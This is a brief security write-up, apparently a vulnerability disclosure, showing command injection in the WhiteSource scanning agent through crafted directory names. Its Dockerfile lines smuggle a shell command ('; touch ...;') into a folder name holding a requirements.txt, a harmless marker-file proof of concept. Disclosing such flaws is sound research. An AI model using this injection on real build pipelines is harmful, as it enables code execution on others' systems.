# Exploiting Whitesource through directory names
Decompiling the [agent](https://github.com/whitesource/unified-agent-distribution/releases/download/v20.4.1.2/wss-unified-agent.jar ) you can find a lot of shell calls in WhiteSource as well. 
The most generic attack vector is to include shell commands in the directory names as the dependency files will always be called in the shell commands and if the escaping is not right you are good to go.
```docker
RUN mkdir -p '; touch /tmp/hacked_whitesource_generic;'
RUN echo "doesnt even matter" >> '; touch /tmp/hacked_whitesource_generic;'/requirements.txt
```
